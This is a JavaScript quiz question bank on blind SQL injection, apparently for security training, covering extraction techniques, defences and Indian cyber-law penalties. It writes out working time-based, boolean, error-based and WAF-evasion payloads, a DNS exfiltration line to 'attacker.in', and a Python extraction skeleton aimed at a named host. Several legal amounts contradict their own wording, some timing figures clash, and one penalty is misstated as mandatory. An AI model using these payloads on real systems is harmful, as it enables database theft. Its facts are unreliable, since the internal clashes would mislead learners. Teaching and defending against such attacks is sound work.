const questions = [
  {
    question: "What is 'Inferential (Blind) SQL Injection', and why is it used against Hardened Production Web Applications?",
    shortAnswer: "An attack technique used when the web application does NOT display database records on screen and suppresses all error messages; the attacker reconstructs confidential database contents character-by-character by asking boolean true/false questions and observing application behavior or time delays.",
    explanation: "In modern production systems, error messages are masked and pages do not display arbitrary user data. An attacker cannot use UNION or Error-based injection. Instead, they ask binary questions: 'Is the first letter of the password 'a'?' If true, the server returns a specific page or pauses for 5 seconds. By iterating through all characters, the attacker extracts entire tables.",
    hint: "Extracting secret data letter-by-letter by playing a true-or-false game when the website displays no errors or search results.",
    level: "basic",
    codeExample: `// Blind SQLi Inference Game:
// Question 1: Is the password length == 8? ➔ Server responds: "Welcome" (TRUE)
// Question 2: Is character 1 ASCII > 100? ➔ Server responds: "User Not Found" (FALSE)
// Question 3: Is character 1 ASCII == 65 ('A')? ➔ Server responds: "Welcome" (TRUE ➔ First char is 'A'!)`
  },
  {
    question: "What is 'Boolean-Based Blind SQL Injection', and what are 'Differential Response Indicators'?",
    shortAnswer: "An attack where the adversary injects SQL boolean conditions (`AND 1=1` vs `AND 1=2`); Differential Response Indicators are observable differences in HTTP response status (200 vs 404), content length, response time, or specific text ('Profile Found' vs 'Not Found') that reveal whether the injected condition was TRUE or FALSE.",
    explanation: "If an endpoint `/user?id=105 AND 1=1` returns a 200 OK with a 4,500-byte page containing 'Account Active', but `/user?id=105 AND 1=2` returns a 200 OK with a 2,100-byte page containing 'Account Inactive', the 2,400-byte content length difference serves as a reliable binary truth oracle.",
    hint: "Observing small changes in the website (like page size or text messages) to know if your injected condition was true or false.",
    level: "moderate",
    codeExample: `// Differential Response Analysis:
// Injected Condition: /profile?id=105 AND (SELECT ascii(substr(password,1,1)) FROM users WHERE id=1) = 83
// If True  ➔ HTTP 200 | Content-Length: 4,512 bytes | Text: "Member Since 2024"
// If False ➔ HTTP 200 | Content-Length: 2,104 bytes | Text: "No Profile Data Found"`
  },
  {
    question: "How does 'Time-Based Blind SQL Injection' work, and how does an Attacker construct a Conditional Time Delay Oracle?",
    shortAnswer: "When the application returns identical visual content and status codes regardless of boolean truth, the attacker injects sleep functions (like `pg_sleep(5)` or `WAITFOR DELAY`); if the server takes 5 seconds to respond, the condition is TRUE; if it responds instantly, the condition is FALSE.",
    explanation: "An attacker injects a conditional clause into a query: in PostgreSQL, `AND (SELECT CASE WHEN (ascii(substr(password,1,1))=65) THEN pg_sleep(5) ELSE pg_sleep(0) END)='a'`. If the first character is 'A', the PostgreSQL backend sleeps for 5 seconds, causing the HTTP response to arrive in 5.2 seconds instead of 0.2 seconds.",
    hint: "Making the server pause for 5 seconds when a guess is right, timing the response with a stopwatch.",
    level: "moderate",
    codeExample: `// Dialect-Specific Time Delay Payloads:
// PostgreSQL : '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;--
// MySQL      : ' AND IF(ascii(substr(password,1,1))=65, SLEEP(5), 0)--
// MSSQL      : '; IF (1=1) WAITFOR DELAY '0:0:5';--
// Oracle     : ' AND 1=(CASE WHEN (1=1) THEN dbms_pipe.receive_message('RDS',5) ELSE 0 END)--`
  },
  {
    question: "How does the 'Binary Search Algorithm' drastically optimize Blind SQL Injection Extraction Speed?",
    shortAnswer: "Instead of testing all 95 printable ASCII characters sequentially ($O(N)$ linear search), Binary Search tests midpoint inequalities (`ASCII > 64`, `ASCII > 96`), halving the search space each request and extracting each character in exactly $\\lceil \\log_2(95) \\rceil = 7$ HTTP requests.",
    explanation: "For printable ASCII characters (range 32 to 126, total 95 characters): Linear search requires an average of $95 / 2 = 47.5$ requests per character. Binary search divides the range in half: Request 1: `ASCII > 79` (False ➔ Range [32, 79]). Request 2: `ASCII > 55` (True ➔ Range [56, 79]). In exactly 7 requests, the precise character is identified.",
    hint: "Using higher/lower guesses like a guessing game to find each letter in only 7 requests instead of 95.",
    level: "expert",
    codeExample: `// Binary Search Extraction Trace for character 'M' (ASCII 77):
// Step 1: ASCII > 79? ➔ FALSE (Search Range: [32, 79])
// Step 2: ASCII > 55? ➔ TRUE  (Search Range: [56, 79])
// Step 3: ASCII > 67? ➔ TRUE  (Search Range: [68, 79])
// Step 4: ASCII > 73? ➔ TRUE  (Search Range: [74, 79])
// Step 5: ASCII > 76? ➔ TRUE  (Search Range: [77, 79])
// Step 6: ASCII > 77? ➔ FALSE (Search Range: [77, 77]) ➔ Character IS Exactly ASCII 77 ('M')!`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for executing Inferential Blind SQL Injection against Critical State Infrastructure?",
    shortAnswer: "Using Blind SQL injection to infer and extract classified databases from critical national information infrastructure (power grids, nuclear systems, defense) to threaten national security is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. Even if an adversary extracts telemetry records silently one bit at a time via time delays against state power grid databases in Barrackpore, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Executing time-based blind SQL injection against SCADA power grid management databases
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What is 'Bit-by-Bit (Bitmasking) Blind Extraction' in SQL Injection?",
    shortAnswer: "An extraction technique where the attacker evaluates each of the 8 individual bits of an ASCII byte using bitwise AND operators (`& 1`, `& 2`, `& 4`, `& 8`, `& 16`, `& 32`, `& 64`, `& 128`), extracting each character in exactly 8 deterministic boolean requests.",
    explanation: "Every ASCII character consists of 8 bits ($b_7 b_6 b_5 b_4 b_3 b_2 b_1 b_0$). An attacker queries: `AND (ascii(substr(password,1,1)) & 1) > 0` (tests Bit 0). If True, Bit 0 is 1. Repeating for all 8 bit positions extracts the exact binary representation of the character in exactly 8 HTTP requests without inequality edge cases.",
    hint: "Checking each individual 1 and 0 of a computer byte to extract the character in 8 questions.",
    level: "expert",
    codeExample: `// Bitmasking SQL Payload:
// Testing if Bit 0 is 1: ' AND (ascii(substr(password,1,1)) & 1) = 1--
// Testing if Bit 1 is 1: ' AND (ascii(substr(password,1,1)) & 2) = 2--
// Testing if Bit 2 is 1: ' AND (ascii(substr(password,1,1)) & 4) = 4--`
  },
  {
    question: "How do Network Jitter and Variable Server Latency Affect Time-Based Blind SQL Injection, and how are 'Statistical Confidence Windows' ($\mu + 3\sigma$) Calculated?",
    shortAnswer: "Network jitter can cause false positives if a normal request randomly takes 5 seconds; attackers calculate baseline server response time ($\mu$) and standard deviation ($\sigma$), setting sleep delays to $\Delta t \ge \mu + 3\sigma$ (e.g. 5 to 10 seconds) to ensure 99.7% statistical confidence.",
    explanation: "If baseline response time is $\mu = 200\text{ ms}$ with standard deviation $\sigma = 50\text{ ms}$, any legitimate response will take $\le 350\text{ ms}$ with 99.7% probability. By injecting `pg_sleep(5)`, a 5,200 ms response time is $> 10\sigma$ away from baseline, eliminating network jitter false positives.",
    hint: "Setting the sleep time long enough (like 5 seconds) so normal internet lag doesn't trick the attacker.",
    level: "expert",
    codeExample: `// Statistical Threshold Formulation:
// Baseline Latency : Mean (mu) = 180 ms, StdDev (sigma) = 40 ms
// Decision Threshold: T_threshold = mu + 3 * sigma = 300 ms
// Injected Sleep Delay: 5,000 ms (Response > 300 ms ➔ 99.9% Statistical Confidence of TRUE!)`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if Blind SQLi leaks citizen financial data?",
    shortAnswer: "Failing to implement reasonable technical safeguards (such as parameterized queries) resulting in personal data exfiltration triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates reasonable security safeguards. If an enterprise in Kolkata fails to sanitize inputs, allowing an attacker to slowly exfiltrate citizen PAN cards or bank accounts via Blind SQLi, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Failing to protect citizen financial data from slow blind SQL injection leaks triggers fines up to ₹250 Crores.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent blind database extraction`
  },
  {
    question: "What is 'Heavy Computational Query' Time-Based Blind SQLi in SQLite and Systems without Sleep Functions?",
    shortAnswer: "An attack used in database engines (like SQLite) that lack built-in sleep functions; the attacker forces the database CPU into heavy mathematical or string operations (like `randomblob(100000000)` or large cross joins) to induce a deliberate 5-second processing delay.",
    explanation: "SQLite does not have a `SLEEP()` function. If an attacker injects: `AND (SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 ...) WHERE ... LIKE randomblob(50000000))`, the SQLite engine evaluates 50 million random bytes, locking CPU execution for 4 to 6 seconds, functioning as a synthetic sleep delay.",
    hint: "Forcing SQLite to do millions of complex math calculations so the computer takes 5 seconds to answer.",
    level: "expert",
    codeExample: `// SQLite Synthetic Sleep Delay Payload:
// Payload: AND (SELECT 1 FROM (SELECT count(*) FROM sqlite_master WHERE 1=1 AND randomblob(50000000)))--
// Result : Forces SQLite engine into 50MB memory allocation, creating a 5.1-second response delay!`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Blind SQL Injection data breaches?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database access resulting from Blind SQL injection to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to database systems) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of Blind SQL injection database leaks within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Extracting Database Length before Content' in Blind SQL Injection?",
    shortAnswer: "The initial reconnaissance step where an attacker uses boolean or time-based queries with `LENGTH()` to discover the exact number of characters in a table name, database name, or password before extracting the individual characters.",
    explanation: "Knowing the exact string length prevents indefinite loops during automated extraction. An attacker queries: `AND (SELECT length(database())) = 7--`. If True, the database name has exactly 7 characters. The extraction loop is then configured to run for exactly $i = 1$ to $7$ character positions.",
    hint: "Measuring the length of a password first so the script knows exactly how many letters to guess.",
    level: "basic",
    codeExample: `// Length Enumeration Step:
// Request 1: /user?id=105 AND (SELECT length(password) FROM users WHERE id=1)=12-- ➔ TRUE!
// Conclusion: The password is EXACTLY 12 characters long. Launch 12 binary search iterations!`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for extracting database records using Blind SQL Injection?",
    shortAnswer: "Securing access and extracting or copying data from a computer system without permission of the owner carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized data extraction.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using Blind SQL injection to exfiltrate 15,000 citizen records from a Barrackpore municipal database
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Conditional Error Blind SQL Injection' (Boolean-Triggered Error Oracles)?",
    shortAnswer: "A blind injection variation where an attacker forces a runtime error (like division by zero: `1/0`) ONLY when a boolean condition is true; if the server responds with a 500 error, the condition was true; if 200 OK, the condition was false.",
    explanation: "In Oracle: `AND (SELECT CASE WHEN (ascii(substr(password,1,1))=65) THEN 1/0 ELSE 1 END FROM dual)=1`. If character 1 is 'A', `1/0` triggers a division-by-zero error, causing an HTTP 500 status. If not 'A', the query evaluates to `1=1` and returns HTTP 200. This provides a fast boolean oracle without needing sleep delays.",
    hint: "Making the database divide by zero only when a guess is right, causing a 500 server error on True.",
    level: "expert",
    codeExample: `// Division-by-Zero Boolean Error Oracle:
// Payload : ' AND (SELECT CASE WHEN (ascii(substr(password,1,1))=65) THEN 1/0 ELSE 1 END FROM dual)=1--
// If True  ➔ 1/0 Evaluates ➔ Database Throws ORA-01476: divisor is equal to zero ➔ HTTP 500!
// If False ➔ 1 Evaluates   ➔ Query Executes Normally ➔ HTTP 200 OK!`
  },
  {
    question: "How do Rate Limiting and WAF Anomaly Detection Detect and Block Blind SQL Injection Attacks?",
    shortAnswer: "Because Blind SQLi requires sending hundreds or thousands of rapid HTTP requests with subtle parameter variations, WAFs and API gateways track request frequencies (e.g. > 50 req/min) or query pattern entropy using Redis sliding windows, automatically blocking the attacker's IP.",
    explanation: "Extracting a 20-character password via binary search requires ≈ 140 HTTP requests. If sent in under 10 seconds, rate limiting middleware flags the IP. Furthermore, time-based attacks that consistently hold server threads for 5 seconds create distinctive long-tail latency spikes in APM monitoring tools (Datadog, Prometheus).",
    hint: "Using rate limiters that block users who send hundreds of automated guessing requests per minute.",
    level: "moderate",
    codeExample: `// Redis Sliding Window Rate Limiter (Defeating Blind SQLi Automation):
const currentRequests = await redis.incr('ratelimit:' + req.ip);
if (currentRequests > 60) { // Limit to 60 requests per minute
    return res.status(429).json({ error: "Too Many Requests: Rate limit exceeded. Security alert logged!" });
}`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for using automated Blind SQLi scripts?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Writing and executing Python Blind SQLi scripts against Kolkata financial portals
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'Extracting Table Names via Blind SQLi' using `LIMIT` and `OFFSET`?",
    shortAnswer: "Iterating through the rows of `information_schema.tables` one by one by adjusting `LIMIT 1 OFFSET 0`, `LIMIT 1 OFFSET 1`, `LIMIT 1 OFFSET 2...` to extract all table names systematically using binary search.",
    explanation: "Because Blind SQLi only extracts one scalar value at a time, attackers cannot use multi-row queries directly. To dump table names: Row 0: `(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)`. Once Table 0 is extracted, the script increments to `OFFSET 1` for Table 1, and so forth.",
    hint: "Using OFFSET 0, OFFSET 1, OFFSET 2 to extract database table names one row at a time.",
    level: "expert",
    codeExample: `// Iterative Row Extraction Payload:
// Table 1: (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)
// Table 2: (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1)`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Defense Architecture against Inferential Blind SQL Injection.",
    shortAnswer: "A defense-in-depth framework combining 100% Parameterized Prepared Statements, Redis Sliding Window Rate Limiting, Threat-Aware WAF Inspection (OWASP CRS), Database Query Timeout Clamping (`statement_timeout = 2000ms`), and Database Activity Monitoring (DAM).",
    explanation: "To achieve complete immunity against Blind SQLi: 1. Code Tier: 100% Parameterized Prepared Statements (compiles AST first, making conditional injection impossible). 2. Gateway Tier: Redis sliding window rate limiter (max 60 req/min per IP) to neutralize automated binary search tools. 3. Database Engine: Setting strict query timeout limits (`statement_timeout = 2000ms` in PostgreSQL / `max_execution_time = 2000` in MySQL) to abort injected sleep functions. 4. Monitoring: DAM alerting on repeated boolean condition probes.",
    hint: "Combine 100% Prepared Statements, Redis rate limiters, strict database statement timeouts, and DAM.",
    level: "expert",
    codeExample: `// Master Blind SQLi Defense Blueprint:
// 1. Prepared Statements : db.execute("SELECT * FROM accounts WHERE id = ?", [safeId]);
// 2. Query Timeout Limit : SET statement_timeout = 2000; (Aborts any sleep delays > 2 seconds!)
// 3. API Rate Limiting   : Redis sliding window limiting clients to 60 requests/minute
// 4. Perimeter WAF       : Cloud WAF dropping requests containing 'pg_sleep' or 'WAITFOR DELAY' signatures`
  },
  {
    question: "What is 'WAF Bypassing in Blind SQLi' using Arithmetic Substitutions (e.g. `ASCII=65` vs `ASCII=(8*8+1)`)?",
    shortAnswer: "Techniques used by adversaries to evade WAF numeric and string filters by replacing numbers with mathematical expressions (`65` $\\to$ `8*8+1`) or string functions (`CHAR(65)` $\\to$ `CHR(65)`).",
    explanation: "If a WAF blocks direct comparisons with digits or single quotes, an attacker replaces: `'A'` with `CHAR(65)`. To evade filters detecting `65`, they write `CHAR(ord('B')-1)` or `CHAR(8*8+1)`. Prepared statements remain 100% immune because all user input is treated strictly as data regardless of mathematical complexity.",
    hint: "Using math like (8*8+1) instead of 65 to trick web firewalls that block specific numbers.",
    level: "expert",
    codeExample: `// Arithmetic WAF Evasion:
// Standard Payload : AND ascii(substr(password,1,1)) = 65--
// Evasion Payload  : AND ascii(substr(password,true+false,true)) = (8*8+1)-- (Zero digits 0-9 used!)`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via Blind SQL Injection Probes?",
    shortAnswer: "Intentionally running automated blind extraction scripts that saturate database connections or lock CPU threads, diminishing the utility of computer systems, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker floods a West Bengal health portal with thousands of automated blind SQL injection requests that exhaust database thread pools, the act constitutes digital mischief under Section 427.",
    hint: "IPC Section 427 covers Mischief and Computer Resource Exhaustion with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Flooding a Kolkata municipal database with 50,000 automated time-delay injection queries
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Blind SQL Injection Extraction Speed Calculation' (Linear vs Binary vs Bitmasking)?",
    shortAnswer: "Linear search requires ≈ 47.5 requests/char; Binary search requires exactly 7 requests/char; Bitmasking requires exactly 8 requests/char; Time-based binary search takes ≈ 35 seconds per character (7 × 5s).",
    explanation: "Extracting a 16-character password: 1. In-Band UNION: 1 request (≈ 0.1 seconds). 2. Boolean Binary Search: 16 × 7 = 112 requests (≈ 5 seconds). 3. Time-Based Binary Search (5s sleep): 16 × 7 × 5s = 560 seconds (≈ 9.3 minutes).",
    hint: "UNION takes 1 second, Boolean blind takes 5 seconds, and Time-based blind takes 10 minutes.",
    level: "moderate",
    codeExample: `// Total Extraction Time Comparison for 16-Character Password:
// In-Band UNION-Based  : 1 Request    ➔ 0.1 Seconds (Instant!)
// Boolean Binary Search: 112 Requests ➔ 5.6 Seconds (Fast)
// Time-Based Blind (5s): 112 Requests ➔ 560.0 Seconds (9.3 Minutes)`
  },
  {
    question: "What is 'Out-of-Band (OOB) SQLi as an Acceleration Alternative' to Slow Time-Based Blind SQLi?",
    shortAnswer: "When time-based blind SQLi is too slow (taking hours), attackers trigger DNS lookups (`xp_dirtree` / `UTL_HTTP`) to send the exfiltrated password directly to an authoritative DNS server in a single request, achieving instant extraction.",
    explanation: "Instead of sending 112 time-delay requests over 10 minutes, an attacker executes: `EXEC master..xp_dirtree '\\\\'+(SELECT password FROM users)+'.attacker.in\\a'`. The database resolves `AdminPass2026.attacker.in` over DNS in 100 milliseconds, bypassing time-based latency constraints entirely.",
    hint: "Using DNS lookups to steal the password in 1 second instead of waiting 10 minutes for sleep delays.",
    level: "expert",
    codeExample: `// OOB Acceleration:
// Time-Based Blind: 112 Requests ➔ 560 Seconds
// Out-of-Band DNS : 1 Request   ➔ 0.1 Seconds (5,600x Faster!)`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing Blind SQL Injection against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching a Blind SQL injection attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing blind SQL injection against SCADA power grid management databases
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Database Statement Timeout Configuration' and how does it Neutralize Time-Based Blind SQLi?",
    shortAnswer: "Configuring the database engine to abort any query executing longer than a strict threshold (e.g. `statement_timeout = 2000ms`); when an attacker injects `pg_sleep(5)`, the database terminates the query after 2 seconds with an error, preventing time-delay inference.",
    explanation: "In PostgreSQL `postgresql.conf`, setting `statement_timeout = 2000` (2 seconds) ensures that any query executing `pg_sleep(5)` or heavy cartesian loops is forcefully terminated by the database engine after 2,000 ms, neutralizing time-based side channels.",
    hint: "Telling the database to cancel any query that takes more than 2 seconds, stopping hackers from using 5-second sleep delays.",
    level: "moderate",
    codeExample: `// PostgreSQL Database Statement Timeout Hardening:
// In postgresql.conf or per-connection:
SET statement_timeout = '2000ms'; -- Aborts any query running longer than 2 seconds!`
  },
  {
    question: "What is 'Second-Order Blind SQL Injection'?",
    shortAnswer: "When an attacker injects a blind conditional payload (`admin' AND (SELECT 1)=1--`) during registration in Step 1, safely stored; later, when an internal batch script evaluates the username in an unsafe query in Step 2, the blind time delay or boolean condition triggers.",
    explanation: "In Phase 1, the user registers with username `admin' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)='a`. In Phase 2, a nightly reconciliation cron job queries: `\"SELECT * FROM activity WHERE user = '\" + user.name + \"'\"`. The cron job freezes for 5 seconds, allowing the attacker to infer internal backend system properties.",
    hint: "Planting a sleep delay inside your username that only freezes backend batch jobs hours later.",
    level: "expert",
    codeExample: `// Second-Order Blind Lifecycle:
// Phase 1 (Store)  : Register username: "admin' AND (SELECT pg_sleep(5))='a" (Stored safely)
// Phase 2 (Trigger): Nightly audit script executes concatenation ➔ Backend worker pauses for 5 seconds!`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via Blind SQL Injection Account Harvesting?",
    shortAnswer: "Dishonestly extracting user login credentials or financial PINs using Blind SQL injection to commit fraud or unauthorized fund transfers, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker uses Blind SQL injection to slowly harvest corporate banking credentials in West Bengal and uses them to execute unauthorized transfers, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Account Harvesting with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using Blind SQL injection to extract corporate banking credentials and executing fraudulent fund transfers
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Blind SQL Injection in Cookie Headers' (e.g. Tracking Cookies)?",
    shortAnswer: "When an application concatenates an HTTP `Cookie: TrackingId=...` header value into a database query; attackers inject blind boolean or time-delay payloads directly inside HTTP headers to extract data without touching web forms.",
    explanation: "If an analytics script does: `db.query(\"SELECT * FROM visits WHERE tracker = '\" + req.cookies.TrackingId + \"'\")`, an attacker submits: `Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (ascii(substr(password,1,1))=65) THEN pg_sleep(5) ELSE 0 END)='a`. The tracking query triggers the time delay, leaking passwords through background cookies.",
    hint: "Injecting sleep delays inside website tracking cookies to steal data without using search boxes.",
    level: "moderate",
    codeExample: `// Cookie-Based Blind SQLi Request:
GET /dashboard HTTP/1.1
Host: kolkata-fintech.in
Cookie: TrackingId=u102' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)='a; session=token99`
  },
  {
    question: "What is 'Automated Blind SQLi with Python asyncio & aiohttp'?",
    shortAnswer: "Using asynchronous non-blocking HTTP client libraries in Python to dispatch binary search probes concurrently, reducing total extraction time for a 20-character password from minutes to seconds.",
    explanation: "Traditional linear scripts send requests sequentially. Using Python `asyncio` and `aiohttp`, an attacker dispatches probes for all 20 character positions in parallel. For each character, the binary search resolves its 7 steps concurrently across 20 asynchronous tasks, extracting the full password in under 2 seconds.",
    hint: "Using asynchronous Python code to guess all 20 letters of a password simultaneously in parallel.",
    level: "expert",
    codeExample: `// Asynchronous Python Blind Extraction Skeleton:
import asyncio, aiohttp

async def probe_character(session, pos, mid):
    payload = f"admin' AND ascii(substr(password,{pos},1))>{mid}--"
    async with session.get("https://kolkata-fintech.in/user", params={"id": payload}) as r:
        return len(await r.text()) > 3000 # True if page length > 3000 bytes!`
  },
  {
    question: "What is 'WAF Request Throttling & Behavioral Anomaly Scoring' against Blind SQLi?",
    shortAnswer: "Next-Generation WAFs that evaluate request rate, parameter mutation patterns, and mathematical token entropy; when a client repeatedly queries `/item?id=105...` with changing ASCII values, the WAF increases the client's anomaly score and issues a CAPTCHA or TCP RST.",
    explanation: "Advanced WAFs (ModSecurity, Cloudflare, AWS WAF) maintain per-session anomaly counters. Each request containing SQL operators increments the score by $+5$. When the threshold ($20$) is reached, subsequent requests are dropped, stopping automated blind extraction tools after only 4 queries.",
    hint: "Firewalls that notice when someone keeps asking the same question with changing numbers and blocks them with a CAPTCHA.",
    level: "expert",
    codeExample: `// ModSecurity Anomaly Scoring Rule for Blind SQLi:
SecRule ARGS "@rx (?i:ascii|substr|length|pg_sleep)" \
    "id:1001,phase:2,t:none,setvar:'tx.anomaly_score=+5',msg:'Blind SQLi Probe Detected!'"`
  },
  {
    question: "Synthesize the mathematical formulation of Information Entropy (H), Binary Search Query Complexity (Q_binary), Time-Delay Confidence Interval (Delta t), and Extraction Throughput (T_blind).",
    shortAnswer: "Information entropy of character c is H(c) = log2(|Sigma|); Binary search query complexity is Q_binary = N * ceil(log2(|Sigma|)); Time-delay extraction duration is T_blind = N * ceil(log2(|Sigma|)) * (mu + 3*sigma + t_sleep); Prepared Statements force Q_binary = infinity (no information leakage), driving H_leak = 0.00 bits.",
    explanation: "Let the alphabet of printable characters be Σ (|Σ| = 95). The Shannon information entropy of an unknown character is H(c) = log2(95) ≈ 6.57 bits. Each binary query provides exactly 1 bit of information (ΔI = 1 bit). Therefore, extracting a string of length N requires: Q_binary = N × ceil(log2(95)) = 7N queries. In time-based blind SQLi with sleep delay t_sleep and baseline latency μ, total extraction duration is: T_time = 7N × (μ + t_sleep). For N = 16 and t_sleep = 5s, T_time = 7(16) × 5.2s = 582.4 seconds. Deploying Parameterized Prepared Statements fixes the AST with zero parameter reflection, providing 0 bits of information per request (ΔI = 0), guaranteeing complete information-theoretic security.",
    hint: "Mathematical proof formula showing that extracting N characters via binary search takes exactly 7N requests, while Prepared Statements eliminate all information leakage.",
    level: "expert",
    codeExample: `// Information Entropy & Binary Search Complexity Mathematical Proof:
// Character Entropy : H(c) = log2(95) = 6.57 bits/character
// Binary Search Cost: Q_binary = 16 characters * ceil(6.57) = 112 queries
// Time-Based Duration: T_time = 112 queries * (0.2s + 5.0s) = 582.4 seconds (~9.7 minutes)
// Prepared Statement: Info Leakage Delta_I = 0.00 bits ➔ 100% MATHEMATICAL IMMUNITY!`
  }
];

export default questions;
